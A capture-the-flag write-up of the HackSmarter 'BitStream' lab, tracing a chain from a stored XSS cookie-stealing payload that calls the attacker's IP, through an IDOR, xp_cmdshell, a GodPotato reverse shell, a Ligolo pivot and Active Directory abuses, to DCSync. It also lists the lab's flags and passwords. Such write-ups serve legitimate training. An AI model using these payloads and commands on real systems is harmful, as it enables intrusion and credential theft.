---
title: HackSmarter - BitStream
date: 2026-08-15
image: cover.png
tags: [HackSmarter, Easy, Windows, Active Directory]
excerpt: An easy HackSmarter range that still packs a full attack chain across a segmented network. A stored XSS on the public web app steals an admin cookie, an IDOR over internal messages leaks SQL service credentials, and MSSQL xp_cmdshell plus SeImpersonate (GodPotato) gives local administrator on the SQL host. From there the path pivots with Ligolo into the domain: cracking a cached credential, kerberoasting EDDIE, stealing an Edge-saved password, abusing a GenericAll ACL, and finding hardcoded Backup Operators credentials in a share script that lead to a DCSync and full domain compromise.
---

# BitStream

BitStream is an easy-rated HackSmarter range, but it plays out like a compact enterprise engagement across a segmented network: a public web server in one zone, a SQL server, file share, and workstation in an internal segment, and a domain controller tucked behind them. The chain starts with a stored XSS on the web app and walks through an IDOR, an MSSQL foothold, a `SeImpersonate` local-admin escalation, a Ligolo pivot into the domain, and a sequence of Active Directory abuses ending in a DCSync. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

## Reconnaissance

### Network Topology

{% image %}

The only host reachable at the start is the web server in the EXT zone, `10.0.0.5`. The topology diagram also gives away the domain name, `bitstream.hsm`.

So let's add this to our `/etc/hosts` file:

```bash
10.0.0.5	web.bitstream.hsm
```

## Web Server: web.bitstream.hsm

### NMAP Scanning - Web Server

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 93:e2:aa:4f:4a:2e:0c:5b:56:fb:a5:78:78:b1:eb:6a (ECDSA)
|   256 4d:a7:e7:59:b0:8d:53:19:be:86:1e:06:a0:d4:57:10 (ED25519)
80/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: BitStream Storage - Corporate Cloud Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services: SSH and an HTTP app on port 80 served by Node.js/Express.

### WhatWeb - Technology Fingerprinting

{% image2 %}

The fingerprint confirms the application is Node.js powered by Express.

### Directory Enumeration

→ Command: `feroxbuster --url http://web.bitstream.hsm/`

{% image3 %}

The only interesting endpoints are `/quote` and `/portal`, but both require an authenticated session to access.

### Stealing the Admin Cookie via XSS

The most promising page is `Get A Quote`, which accepts a free-text requirement. Since that input is likely reviewed by an administrator, it is a natural place to try a stored XSS payload that exfiltrates the reviewer's cookie:

{% image4 %}

Using the following payload, we receive the cookie on our listener:

```bash
<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
```

{% image5 %}

Setting the captured `session_id` cookie in our browser grants access to the `/portal` endpoint:

{% image6 %}

### IDOR - Enumerating Internal Messages

Opening an internal message reveals a telling detail: the message URL ends in a small, predictable integer. That is a classic Insecure Direct Object Reference - by iterating the identifier, we may be able to read messages that are not listed in our own inbox.

{% image7 %}

To confirm the range, we fuzz it with `ffuf`. First we generate a numeric wordlist with `seq 0 1000 > numbers.txt` (one number per line, 0 to 1000):

```bash
ffuf -u "http://web.bitstream.hsm/portal/messages/FUZZ" -w numbers.txt -H "Cookie: session_id=163e4090-3741-4d7e-82c3-7037743e6e59"
```

{% image8 %}

With the valid identifiers known, we iterate through each one and parse out the message contents with a small Python script (this kind of boilerplate is quick to generate with an LLM):

```python
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import time

BASE_URL = "http://web.bitstream.hsm/portal/messages/"
COOKIE = {"session_id": "163e4090-3741-4d7e-82c3-7037743e6e59"}

# Numbers from ffuf results
NUMBERS = [7, 2, 4, 16, 5, 3, 8, 6, 1, 12, 13, 15, 9, 11, 17, 27, 22, 18, 23, 19, 21, 24, 20, 25, 26, 14, 10]

def extract_message_info(html_content):
    """Extract sender, recipient, date, and message from div.card"""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    # Find the card div
    card = soup.find('div', class_='card')
    if not card:
        return None
    
    # Extract the details
    info = {}
    
    # Find all <p> tags in the first div (sender, recipient, date)
    details_div = card.find('div', style=lambda x: x and 'border-bottom' in x)
    if details_div:
        for p in details_div.find_all('p'):
            text = p.get_text(strip=True)
            if text.startswith('From:'):
                info['from'] = text.replace('From:', '').strip()
            elif text.startswith('To:'):
                info['to'] = text.replace('To:', '').strip()
            elif text.startswith('Date:'):
                info['date'] = text.replace('Date:', '').strip()
    
    # Extract the message body (second div)
    message_div = card.find('div', style=lambda x: x and 'font-size' in x)
    if message_div:
        info['message'] = message_div.get_text(strip=True)
    
    return info

def fetch_message(number):
    """Fetch and extract message info for a given number"""
    url = f"{BASE_URL}{number}"
    
    try:
        response = requests.get(url, cookies=COOKIE, timeout=10)
        
        if response.status_code == 200:
            info = extract_message_info(response.text)
            if info:
                return number, info
            else:
                return number, None
        else:
            return number, None
            
    except requests.exceptions.RequestException as e:
        print(f"Error fetching {number}: {e}")
        return number, None

def main():
    print(f"\n{'='*80}")
    print(f"MESSAGE EXTRACTION")
    print(f"{'='*80}\n")
    
    for number in NUMBERS:
        num, info = fetch_message(number)
        
        if info:
            print(f"📬 MESSAGE #{number}")
            print(f"{'-'*60}")
            print(f"From:  {info.get('from', 'N/A')}")
            print(f"To:    {info.get('to', 'N/A')}")
            print(f"Date:  {info.get('date', 'N/A')}")
            print(f"\nMessage:")
            print(f"{info.get('message', 'N/A')}")
            print(f"\n{'-'*60}\n")
        else:
            print(f"❌ Message #{number}: Not found or no card div\n")
        
        time.sleep(0.3)  # Be polite to the server

if __name__ == "__main__":
    main()
```

Running it dumps the hidden messages, one of which contains a flag:

{% image9 %}

> [!FLAG] What is the flag found in internal messages? (Begins with `{HSM}...`)
>
> `{HSM}7h1s_1s_y0ur_1D0R_fl4g`

{% image10 %}

Another message leaks a service account credential:

> [!FLAG] What username:password combination did you find in the message (in this format: username:password)
>
> `sql_svc:SQL_Svc_P@ss_99!`

{% image11 %}

A further message from Joey references a shared folder, which becomes relevant later:

{% image12 %}

## Segment 2: SQL Server to Local Administrator

### Not So Segmented

I initially assumed the internal Segment 2 hosts were unreachable, but that is not the case - only ICMP is blocked. TCP services on those hosts answer fine, so we can scan and interact with them directly.

### NMAP Scanning - SQL Server

The certificate bodies in the scans below are trimmed to their metadata, since the base64 blobs add nothing to the analysis.

```bash
PORT     STATE SERVICE       REASON          VERSION
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server  17.00.1000.00
|_ssl-date: 2026-08-15T09:27:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-15T08:22:00
| Not valid after:  2056-08-15T08:22:00
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
| ms-sql-info:
|   10.0.1.7:1433:
|     Version:
|       name: Microsoft SQL Server
|       number: 17.00.1000.00
|       Product: Microsoft SQL Server
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.0.1.7:1433:
|     Target_Name: BITSTREAM
|     NetBIOS_Domain_Name: BITSTREAM
|     NetBIOS_Computer_Name: SQL
|     DNS_Domain_Name: bitstream.hsm
|     DNS_Computer_Name: SQL.bitstream.hsm
|     DNS_Tree_Name: bitstream.hsm
|_    Product_Version: 10.0.26100
3389/tcp open  ms-wbt-server syn-ack ttl 127
| rdp-ntlm-info:
|   Target_Name: BITSTREAM
|   NetBIOS_Domain_Name: BITSTREAM
|   NetBIOS_Computer_Name: SQL
|   DNS_Domain_Name: bitstream.hsm
|   DNS_Computer_Name: SQL.bitstream.hsm
|   DNS_Tree_Name: bitstream.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-15T09:27:08+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=SQL.bitstream.hsm
| Issuer: commonName=SQL.bitstream.hsm
| Not valid before: 2026-05-25T20:17:46
| Not valid after:  2026-11-24T20:17:46
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

This host is `SQL.bitstream.hsm` at `10.0.1.7`, running MSSQL 2025 and WinRM.

### NMAP Scanning - File Share

```python
PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
| ssl-cert: Subject: commonName=SHARE.bitstream.hsm
| Issuer: commonName=SHARE.bitstream.hsm
| Not valid before: 2026-05-27T15:36:17
| Not valid after:  2026-11-26T15:36:17
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: BITSTREAM
|   NetBIOS_Domain_Name: BITSTREAM
|   NetBIOS_Computer_Name: SHARE
|   DNS_Domain_Name: bitstream.hsm
|   DNS_Computer_Name: SHARE.bitstream.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-15T09:29:03+00:00
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### NMAP Scanning - Workstation

```python
PORT     STATE SERVICE       REASON          VERSION
3389/tcp open  ms-wbt-server syn-ack ttl 127
| rdp-ntlm-info:
|   Target_Name: BITSTREAM
|   NetBIOS_Domain_Name: BITSTREAM
|   NetBIOS_Computer_Name: WKST
|   DNS_Domain_Name: bitstream.hsm
|   DNS_Computer_Name: WKST.bitstream.hsm
|   Product_Version: 10.0.26100
|_  System_Time: 2026-08-15T09:29:24+00:00
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=WKST.bitstream.hsm
| Issuer: commonName=WKST.bitstream.hsm
| Not valid before: 2026-05-25T18:38:27
| Not valid after:  2026-11-24T18:38:27
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Between the three scans we now know the internal segment holds `SQL` (`10.0.1.7`), `SHARE` (`10.0.1.5`), and `WKST` (`10.0.1.6`), all domain-joined to `bitstream.hsm`.

### Connecting to MSSQL as sql_svc

With the `sql_svc` credentials leaked from the internal messages, connecting to the SQL host is straightforward:

```bash
impacket-mssqlclient 'sql_svc':'SQL_Svc_P@ss_99!'@sql.bitstream.hsm
```

{% image13 %}

### SQL Enumeration

→ Database enumeration:

{% image14 %}

→ Enumerating linked servers:

{% image15 %}

→ Enumerating impersonatable logins:

{% image16 %}

→ Enumerating users:

{% image17 %}

Since we are `dbo@master`, we can enable `xp_cmdshell` and run operating-system commands directly on the host:

{% image18 %}

> [!FLAG] What MSSQL module allows you to run remote commands? (`**_********`)
>
> `xp_cmdshell`

{% image19 %}

### xp_cmdshell to SeImpersonate to Local Administrator

Command execution runs in the context of the SQL service account, which holds `SeImpersonatePrivilege` - the standard prerequisite for a potato-style local escalation:

{% image20 %}

To abuse it we use GodPotato ([BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)). We start a local Python HTTP server and pull the binary onto the target with `certutil.exe`:

{% image21 %}

We also transfer `nc.exe` ([int0x33/nc.exe](https://github.com/int0x33/nc.exe/)) and use GodPotato to fire a reverse shell back to us running as the local administrator:

{% image22 %}

To keep a foothold in case the shell drops, we create a backup local administrator account:

```bash
net user 0xd1s Password123! /add
net localgroup Administrators 0xd1s /add
```

### Dumping Hashes and Cracking Bob's Cached Credential

With local administrator, we can save the `SAM`, `SYSTEM`, and `SECURITY` hives to extract stored secrets:

```bash
C:\Users\Administrator\Downloads>reg save hklm\sam .\sam
reg save hklm\sam .\sam
The operation completed successfully.

C:\Users\Administrator\Downloads>reg save hklm\system .\system
reg save hklm\system .\system
The operation completed successfully.

C:\Users\Administrator\Downloads>reg save hklm\security .\security
reg save hklm\security .\security
The operation completed successfully.
```

Then we pull the hives down with `evil-winrm`:

{% image23 %}

And run `impacket-secretsdump` locally against them:

```bash
impacket-secretsdump -sam sam -system system -security security LOCAL
```

{% image24 %}

The dump yields a credential for the user `bob`, but it is a DCC2 (Domain Cached Credentials v2) hash rather than an NT hash. These cannot be passed and must be cracked, using hashcat mode `2100`:

```bash
sudo hashcat -m 2100 bob.hash /usr/share/wordlists/rockyou.txt
```

{% image25 %}

The hash cracks, revealing bob's password as `pokemon`:

> [!FLAG] What is Bob's password?
>
> `pokemon`

{% image26 %}

## Pivoting to the Domain Controller

### Setting Up the Ligolo Tunnel

At this point we can reach the Segment 2 hosts, but not the domain controller. Since the SQL machine can reach the DC, we route our traffic through it with Ligolo:

{% image27 %}

We know from the network topology that `10.0.2.5` is the domain controller. It is also worth remembering that in an Active Directory environment the domain controller almost always doubles as the domain's DNS server - so to resolve `bitstream.hsm` names and to satisfy Kerberos, we will need to point our name resolution at the DC and generate a matching hosts and `krb5.conf` configuration once the tunnel is up.

On our Kali machine we start the Ligolo proxy:

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

Then we create a new interface with `ifcreate --name sql_tunnel` and add a route toward the DC subnet with `route_add --name sql_tunnel --route 10.0.2.0/24`.

Next we transfer `agent.exe` to the SQL host and connect it back to our Ligolo instance: `.\agent.exe -connect 192.168.211.2:11601 -ignore-cert`

Finally we bring the tunnel up with `tunnel_start --tun sql_tunnel`:

{% image28 %}

We verify reachability to the DC with a simple NetExec query over SMB:

{% image29 %}

### Domain Controller - Configuration Files

Now that the DC is reachable, we generate a proper hosts file and `krb5.conf` for it:

{% image30 %}

The hosts file ends up as:

```bash
10.0.0.5	web.bitstream.hsm
10.0.1.7	sql.bitstream.hsm
10.0.1.6	wkst.bitstream.hsm
10.0.1.5	share.bitstream.hsm
10.0.2.5	DC01.bitstream.hsm bitstream.hsm DC01
```

Plain LDAP on this DC requires channel binding (`strongerAuthRequired`), and LDAPS has no certificate configured. The way around both restrictions is Kerberos authentication, so we request a TGT for bob using his cracked password:

```bash
impacket-getTGT bitstream.hsm/bob:'pokemon' -dc-ip 10.0.2.5
export KRB5CCNAME=./bob.ccache
```

With the ticket exported, we collect BloodHound data using `rusthound`:

```bash
rusthound -d bitstream.hsm -k -f DC01.bitstream.hsm -i 10.0.2.5 -c All -z
```

{% image31 %}

## Active Directory: From EDDIE to Domain Admin

### Kerberoasting EDDIE

The BloodHound data flags a kerberoastable account:

> [!FLAG] What user is kerberoastable? (just the name - i.e. bob)
>
> `EDDIE`

{% image32 %}

We roast this account with NetExec or `impacket-GetUserSPNs`:

{% image33 %}

And crack the resulting ticket with John the Ripper to recover the password:

{% image34 %}

Spraying the recovered password across the internal services shows it grants RDP access to the Workstation:

{% image35 %}

### Workstation - RDP and Edge Credential Theft

Connecting over RDP (`xfreerdp3 /u:eddie /p:superman /v:10.0.1.6`), the Desktop has Microsoft Edge installed. Given a recent CVE that allows dumping saved credentials from memory, I looked into the browser's saved logins and found that this user has a stored password for `gitlab.hsm`:

{% image36 %}

Inspecting the saved entry, the credentials actually belong to another user, `luisa`:

{% image37 %}

We validate them with a quick SMB query:

{% image38 %}

> [!FLAG] What is Luisa's password?
>
> `Lulu_Des1gn!!`

{% image39 %}

### Luisa - ACL Abuse over James

BloodHound shows that luisa has `GenericAll` over the user JAMES, which means we can reset that account's password outright:

{% image40 %}

> [!FLAG] What permission does Luisa have over James in the Active Directory environment? (`G******A**`)
>
> `GenericAll`

{% image41 %}

We reset James's password with `bloodyAD`:

```bash
bloodyAD -d bitstream.hsm -u 'luisa' -p 'Lulu_Des1gn!!' -i 10.0.2.5 set password JAMES 'Password123!'
```

{% image42 %}

### Share Machine Access

As James, we now have access to the `Scripts` folder on the share:

{% image43 %}

Connecting to the share and listing its contents shows the following:

{% image44 %}

Inside `Automated-AD-Backup.ps1` there are hardcoded plaintext credentials:

{% image45 %}

> [!FLAG] What is the password for svc_backup?
>
> `P@ssw0rd2025!`

{% image46 %}

### Domain Compromise via DCSync

Checking the privileges of `svc_backup`, the account is a member of the `BACKUP OPERATORS` group:

{% image47 %}

Membership of that group is enough to perform a DCSync attack against the domain:

{% image48 %}

We run it with `impacket-secretsdump`:

```bash
impacket-secretsdump bitstream.hsm/svc_backup:'P@ssw0rd2025!'@DC01.bitstream.hsm
```

{% image49 %}

Finally, we use the dumped Administrator hash to authenticate to the domain controller over WinRM with `evil-winrm` and grab the final flag:

{% image50 %}

> [!FLAG] What is the final flag? (located on the Administrator's Desktop)
>
> `{HSM}FULL_DOMAIN_COMPROMISE`

{% image51 %}

BitStream is rated easy, but it is a great end-to-end lab: it strings together a web exploitation phase (XSS and IDOR), a service-account foothold, a `SeImpersonate` escalation, a network pivot, and a full Active Directory kill chain (kerberoasting, browser credential theft, ACL abuse, and finally DCSync) into one coherent narrative. Each step hands you exactly the material you need for the next, which makes it an excellent box for practicing the full flow from external web app to Domain Admin.
